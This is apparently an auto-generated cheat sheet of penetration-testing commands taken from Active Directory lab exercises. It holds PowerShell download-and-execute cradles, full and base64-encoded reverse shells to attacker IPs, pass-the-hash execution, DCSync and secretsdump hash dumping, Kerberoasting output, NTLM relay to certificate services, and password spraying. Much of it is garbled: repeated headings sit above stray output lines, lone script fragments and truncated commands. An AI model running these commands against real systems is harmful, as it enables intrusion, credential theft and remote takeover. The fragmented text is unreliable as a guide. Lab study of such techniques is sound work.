# Impacket

% impacket, smb, kerberos, secretsdump, cpts

## Impacket - Impacket - Impacket - Impacket - Impacket - dumping-and-cracking-the-hashes
#cat/ATTACK #cpts
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc
#cat/ATTACK #cpts
```
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-2
#cat/ATTACK #cpts
```
IEX (iwr 'http://EVIL/evil.ps1')
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-3
#cat/ATTACK #cpts
```
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-4
#cat/ATTACK #cpts
```
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-5
#cat/ATTACK #cpts
```
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-6
#cat/ATTACK #cpts
```
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-7
#cat/ATTACK #cpts
```
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-8
#cat/ATTACK #cpts
```
$a = New-Object System.Xml.XmlDocument
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-9
#cat/ATTACK #cpts
```
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
```

## Impacket - Impacket - Impacket - Impacket - Impacket - misc-10
#cat/ATTACK #cpts
```
$a.command.a.execute | iex
```

## Impacket - Impacket - Impacket - Impacket - Impacket - create-the-smb-share-and-copy-the-file
#cat/ATTACK #cpts
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perl
#cat/ATTACK #cpts
```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1
#cat/ATTACK #cpts
```
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-2
#cat/ATTACK #cpts
```
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-3
#cat/ATTACK #cpts
```
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-4
#cat/ATTACK #cpts
```
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-5
#cat/ATTACK #cpts
```
$shaManaged = New-Object System.Security.Cryptography.SHA256Managed
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-6
#cat/ATTACK #cpts
```
$aesManaged = New-Object System.Security.Cryptography.AesManaged
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-7
#cat/ATTACK #cpts
```
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-8
#cat/ATTACK #cpts
```
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-9
#cat/ATTACK #cpts
```
$aesManaged.BlockSize = 128
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-10
#cat/ATTACK #cpts
```
$aesManaged.KeySize = 256
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-11
#cat/ATTACK #cpts
```
$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-12
#cat/ATTACK #cpts
```
$File = Get-Item -Path $Path -ErrorAction SilentlyContinue
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-13
#cat/ATTACK #cpts
```
Write-Error -Message "File not found!"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-14
#cat/ATTACK #cpts
```
$plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-15
#cat/ATTACK #cpts
```
$outPath = $File.FullName + ".aes"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-16
#cat/ATTACK #cpts
```
$encryptor = $aesManaged.CreateEncryptor()
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-17
#cat/ATTACK #cpts
```
$encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-18
#cat/ATTACK #cpts
```
$encryptedBytes = $aesManaged.IV + $encryptedBytes
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-19
#cat/ATTACK #cpts
```
$aesManaged.Dispose()
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-20
#cat/ATTACK #cpts
```
(Get-Item $outPath).LastWriteTime = $File.LastWriteTime
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-21
#cat/ATTACK #cpts
```
$cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-22
#cat/ATTACK #cpts
```
$outPath = $File.FullName -replace ".aes"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-23
#cat/ATTACK #cpts
```
$aesManaged.IV = $cipherBytes[0..15]
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-24
#cat/ATTACK #cpts
```
$decryptor = $aesManaged.CreateDecryptor()
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-25
#cat/ATTACK #cpts
```
$decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-26
#cat/ATTACK #cpts
```
$shaManaged.Dispose()
```

## Impacket - Impacket - Impacket - Impacket - Impacket - windows
#cat/ATTACK #cpts
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535 | %{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - windows-2
#cat/ATTACK #cpts
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.197',7777);$s = $client.GetStream();[byte[]]$b = 0..65535 | %{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - windows-3
#cat/ATTACK #cpts
```
$LHOST = "10.10.14.197"; $LPORT = 7777; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output =
```

## Impacket - Impacket - Impacket - Impacket - Impacket - windows-4
#cat/ATTACK #cpts
Voir [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<port>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535 | %{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Impacket - Impacket - Impacket - Impacket - Impacket - capture-service-hash
#cat/ATTACK #cpts
On our machine

```
sudo responder -I tun0
```

## Impacket - Impacket - Impacket - Impacket - Impacket - capture-service-hash-2
#cat/ATTACK #cpts
On our machine

```
sudo impacket-smbserver share ./ -smb2support
```

## Impacket - Impacket - Impacket - Impacket - Impacket - identifying-linked-servers
#cat/ATTACK #cpts
```
mssqlclient.py 'df:qwe123QWE!@#@10.13.38.11'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - smb-interactions
#cat/ATTACK #cpts
Accès au share

```
smbclient -U <user> -L \\\\<ip>\\$share
```

## Impacket - Impacket - Impacket - Impacket - Impacket - bruteforce-user-rids
#cat/ATTACK #cpts
```
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\ | user_rid\ | group_rid" && echo "";done
```

## Impacket - Impacket - Impacket - Impacket - Impacket - bruteforce-user-rids-2
#cat/ATTACK #cpts
```
samrdump.py <ip>
```

## Impacket - Impacket - Impacket - Impacket - Impacket - creating-shadow-copy-of-c
#cat/ATTACK #cpts
Now on our machine

```
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - wmi
#cat/ATTACK #cpts
```
Import-Module .\Invoke-TheHash.psd1
```

## Impacket - Impacket - Impacket - Impacket - Impacket - wmi-2
#cat/ATTACK #cpts
```
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATAB
```

## Impacket - Impacket - Impacket - Impacket - Impacket - impacket-linux
#cat/ATTACK #cpts
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

## Impacket - Impacket - Impacket - Impacket - Impacket - remote-procedure-call-rpc
#cat/ATTACK #cpts
Remote Procedure Call (RPC) We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller. The rpcclient tool offers us many different commands to execute specific functions on the SMB

```
rpcclient -U'%' 10.10.110.17
```

## Impacket - Impacket - Impacket - Impacket - Impacket - dont-forget-to-try-standalone-responder-on-compromised-machine-and-be-
#cat/ATTACK #cpts
Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by ad

```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

## Impacket - Impacket - Impacket - Impacket - Impacket - create-a-reverseshellhttpswwwrevshellscom
#cat/ATTACK #cpts
On the victime

```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAK
```

## Impacket - Impacket - Impacket - Impacket - Impacket - identifying-keytab-files-in-cronjobs
#cat/ATTACK #cpts
```
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

## Impacket - Impacket - Impacket - Impacket - Impacket - identifying-keytab-files-in-cronjobs-2
#cat/ATTACK #cpts
In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/us

```
smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
```

## Impacket - Impacket - Impacket - Impacket - Impacket - connecting-to-smb-share-as-carlos
#cat/ATTACK #cpts
```
smbclient //dc01/carlos -k -c ls
```

## Impacket - Impacket - Impacket - Impacket - Impacket - abusing-keytab-ccache
#cat/ATTACK #cpts
There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using id.

```
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

## Impacket - Impacket - Impacket - Impacket - Impacket - abusing-keytab-ccache-2
#cat/ATTACK #cpts
There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using id.

```
:~# smbclient //dc01/C$ -k -c ls -no-pass
```

## Impacket - Impacket - Impacket - Impacket - Impacket - abusing-keytab-ccache-3
#cat/ATTACK #cpts
There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using id.

```
$Recycle.Bin DHS 0 Wed Oct 6 17:31:14 2021
```

## Impacket - Impacket - Impacket - Impacket - Impacket - abusing-keytab-ccache-4
#cat/ATTACK #cpts
There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using id.

```
john D 0 Mon Jul 18 13:19:50 2022
```

## Impacket - Impacket - Impacket - Impacket - Impacket - miscellaneous
#cat/ATTACK #cpts
If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert

```
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

## Impacket - Impacket - Impacket - Impacket - Impacket - on-our-machine-again
#cat/ATTACK #cpts
To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.

```
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

## Impacket - Impacket - Impacket - Impacket - Impacket - on-our-machine-again-2
#cat/ATTACK #cpts
To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - pass-the-certificate
#cat/ATTACK #cpts
[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for Public Key Cryptography for Initial Authentication, is an extension of the Kerberos protocol

```
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

## Impacket - Impacket - Impacket - Impacket - Impacket - pass-the-certificate-2
#cat/ATTACK #cpts
Referring back to ntlmrelayx, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for DC01\$:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
```

## Impacket - Impacket - Impacket - Impacket - Impacket - pass-the-certificate-3
#cat/ATTACK #cpts
```
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

## Impacket - Impacket - Impacket - Impacket - Impacket - pass-the-certificate-4
#cat/ATTACK #cpts
Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain

```
export KRB5CCNAME=/tmp/dc.ccache
```

## Impacket - Impacket - Impacket - Impacket - Impacket - pass-the-certificate-5
#cat/ATTACK #cpts
Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain

```
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - shadow-credentials-msds-keycredentiallink
#cat/ATTACK #cpts
In the output above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown. We will use this file with gettgtpkinit.py to acquire a TGT as the victim:

```
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

## Impacket - Impacket - Impacket - Impacket - Impacket - rpcclient
#cat/ATTACK #cpts
```
rpcclient -U "" -N 172.16.5.5
```

## Impacket - Impacket - Impacket - Impacket - Impacket - rpcclient-2
#cat/ATTACK #cpts
```
rpcclient $> querydominfo
```

## Impacket - Impacket - Impacket - Impacket - Impacket - rpcclient-3
#cat/ATTACK #cpts
```
rpcclient $> getdompwinfo
```

## Impacket - Impacket - Impacket - Impacket - Impacket - enum4linux
#cat/ATTACK #cpts
```
enum4linux -P 172.16.5.5
```

## Impacket - Impacket - Impacket - Impacket - Impacket - enum4linux-2
#cat/ATTACK #cpts
```
enum4linux complete on Tue Feb 22 17:39:29 2022
```

## Impacket - Impacket - Impacket - Impacket - Impacket - rpcclient-4
#cat/ATTACK #cpts
```
rpcclient $> enumdomusers
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-a-bash-one-liner-for-the-attack
#cat/ATTACK #cpts
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

## Impacket - Impacket - Impacket - Impacket - Impacket - user-enum
#cat/ATTACK #cpts
While looking at users in rpcclient, you may notice a field called rid: beside each user. A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify o

```
rpcclient $> queryuser 0x457
```

## Impacket - Impacket - Impacket - Impacket - Impacket - psexecpy
#cat/ATTACK #cpts
One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploadin

```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

## Impacket - Impacket - Impacket - Impacket - Impacket - wmiexecpy
#cat/ATTACK #cpts
Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other module

```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

## Impacket - Impacket - Impacket - Impacket - Impacket - kerberoasting-with-getuserspnspy
#cat/ATTACK #cpts
*A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have t

```
sudo python3 -m pip install .
```

## Impacket - Impacket - Impacket - Impacket - Impacket - listing-getuserspnspy-help-options
#cat/ATTACK #cpts
```
GetUserSPNs.py -h
```

## Impacket - Impacket - Impacket - Impacket - Impacket - listing-getuserspnspy-help-options-2
#cat/ATTACK #cpts
```
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - listing-spn-accounts-with-getuserspnspy
#cat/ATTACK #cpts
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

## Impacket - Impacket - Impacket - Impacket - Impacket - requesting-all-tgs-tickets
#cat/ATTACK #cpts
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

## Impacket - Impacket - Impacket - Impacket - Impacket - requesting-all-tgs-tickets-2
#cat/ATTACK #cpts
```
$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d
```

## Impacket - Impacket - Impacket - Impacket - Impacket - requesting-all-tgs-tickets-3
#cat/ATTACK #cpts
```
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575
```

## Impacket - Impacket - Impacket - Impacket - Impacket - requesting-a-single-tgs-ticket
#cat/ATTACK #cpts
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

## Impacket - Impacket - Impacket - Impacket - Impacket - requesting-a-single-tgs-ticket-2
#cat/ATTACK #cpts
```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60
```

## Impacket - Impacket - Impacket - Impacket - Impacket - saving-the-tgs-ticket-to-an-output-file
#cat/ATTACK #cpts
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-find-interestingdomainacl
#cat/ATTACK #cpts
```
ObjectDN : DC=INLANEFREIGHT,DC=LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-get-domainobjectacl
#cat/ATTACK #cpts
```
ObjectDN : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-a-reverse-search-mapping-to-a-guid-value
#cat/ATTACK #cpts
```
Name : User-Force-Change-Password
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-the--resolveguids-flag
#cat/ATTACK #cpts
```
AceQualifier : AccessAllowed
```

## Impacket - Impacket - Impacket - Impacket - Impacket - a-useful-foreach-loop
#cat/ATTACK #cpts
```
Path : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana
```

## Impacket - Impacket - Impacket - Impacket - Impacket - further-enumeration-of-rights-using-damundsen
#cat/ATTACK #cpts
```
AceType : AccessAllowed
```

## Impacket - Impacket - Impacket - Impacket - Impacket - investigating-the-help-desk-level-1-group-with-get-domaingroup
#cat/ATTACK #cpts
```
memberof
```

## Impacket - Impacket - Impacket - Impacket - Impacket - changing-the-users-password
#cat/ATTACK #cpts
```
VERBOSE: [Get-PrincipalContext] Using alternate credentials
```

## Impacket - Impacket - Impacket - Impacket - Impacket - adding-damundsen-to-the-help-desk-level-1-group
#cat/ATTACK #cpts
```
CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - confirming-damundsen-was-added-to-the-group
#cat/ATTACK #cpts
```
MemberName
```

## Impacket - Impacket - Impacket - Impacket - Impacket - creating-a-fake-spn
#cat/ATTACK #cpts
```
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
```

## Impacket - Impacket - Impacket - Impacket - Impacket - creating-a-fake-spn-2
#cat/ATTACK #cpts
```
(&( | ( | (samAccountName=adunn)(name=adunn)(displayname=adunn))))
```

## Impacket - Impacket - Impacket - Impacket - Impacket - kerberoasting-with-rubeus
#cat/ATTACK #cpts
```
(_____ \
```

## Impacket - Impacket - Impacket - Impacket - Impacket - converting-the-sddl-string-into-a-readable-format
#cat/ATTACK #cpts
```
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions
```

## Impacket - Impacket - Impacket - Impacket - Impacket - converting-the-sddl-string-into-a-readable-format-2
#cat/ATTACK #cpts
```
(Traverse)...}
```

## Impacket - Impacket - Impacket - Impacket - Impacket - converting-the-sddl-string-into-a-readable-format-3
#cat/ATTACK #cpts
If we choose to filter on the DiscretionaryAcl property, we can see that the modification was likely giving the mrb3n user GenericWrite privileges over the domain object itself, which could be indicative of an attack att

```
Everyone: AccessDenied (WriteData)
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-get-domainuser-to-view-adunns-group-membership
#cat/ATTACK #cpts
```
samaccountname : adunn
```

## Impacket - Impacket - Impacket - Impacket - Impacket - extracting-ntlm-hashes-and-kerberos-keys-using-secretsdumppy
#cat/ATTACK #cpts
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

## Impacket - Impacket - Impacket - Impacket - Impacket - extracting-ntlm-hashes-and-kerberos-keys-using-secretsdumppy-2
#cat/ATTACK #cpts
```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
```

